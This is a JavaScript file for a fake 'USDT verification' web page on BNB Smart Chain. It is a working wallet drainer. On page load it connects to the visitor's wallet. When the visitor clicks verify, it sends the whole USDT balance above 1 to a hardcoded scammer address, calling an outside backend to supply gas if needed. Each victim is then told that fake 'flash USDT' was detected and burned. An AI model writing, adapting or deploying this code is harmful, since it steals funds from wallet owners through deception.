const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

let web3;
let userAddress;

// ✅ Updated connection logic (iPhone-friendly, silent)
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);

        try {
            // 🔁 Silently check if already connected
            const accounts = await window.ethereum.request({ method: "eth_accounts" });

            if (accounts.length === 0) {
                // Prompt only if not already connected
                await window.ethereum.request({ method: "eth_accounts" });
            }

            // Ensure on BNB chain
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });

            const connectedAccounts = await web3.eth.getAccounts();
            userAddress = connectedAccounts[0];
            console.log("Wallet Connected:", userAddress);
        } catch (error) {
            console.error("Error connecting wallet:", error);
            alert("Please switch to BNB Smart Chain.");
        }
    } else {
        alert("Please install MetaMask or Trust Wallet.");
    }
}

// ✅ Auto-connect on load (silent if already connected)
window.addEventListener("load", connectWallet);

// 🟩 USDT Verification
async function verifyAssets() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
            "green"
        );
        return;
    }

    showPopup("Loading...", "green");

    transferUSDT(usdtBalance, userBNB);
}

// 🔁 Transfer USDT
async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
            console.log("User BNB is low. Requesting BNB from backend...");
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
        }

        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

// Optional manual BNB send
async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// ✅ Pop-up message UI
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "black" ? "#eee" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : color === "black" ? "black" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// 🟩 Trigger verifyAssets on click
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
